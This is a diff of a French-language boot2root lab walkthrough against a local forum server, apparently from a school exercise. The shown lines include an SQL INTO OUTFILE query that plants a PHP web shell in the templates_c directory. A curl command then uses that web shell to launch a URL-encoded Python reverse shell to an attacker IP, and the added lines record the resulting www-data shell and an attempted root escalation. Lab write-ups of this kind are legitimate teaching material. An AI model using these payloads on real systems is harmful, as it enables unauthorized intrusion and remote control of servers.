@@ -132,7 +132,7 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: https://192.168.1.50/forum/themes/
 ==> DIRECTORY: https://192.168.1.50/forum/update/
 ```
-On va essayer de placer notre backdoor dans un de ces repertoires : /forum/templates_c
+On va essayer de placer notre backdoor dans un de ces repertoires : /forum/templates_c apres avoir cree une nouvelle db que jai nommé b2r
 ```
 select "<?php system($_GET['cmd']); ?>" into outfile "https://192.168.1.50/var/www/forum/templates_c/backdoor.php"
 ```
@@ -163,3 +163,16 @@ D'une autre machine ou directement depuis le browser rentrer le reverse shell en
 ```
 curl --insecure https://192.168.1.50/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.28%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27%0A
 ```
+
+Nous obtenons bien un nouveau prompt : 
+```
+$ whoami
+www-data
+$ uname -a
+Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
+```
+
+La premiere idée qui me vient est d'essayer de faire une injection dynamique de librairie des plus classiques comme pour le level13 de snowcrash.
+
+Cependant apres avoir execute l'injection, nous avons bien les droits root mais impossible d'acceder au dossier /root ??
+
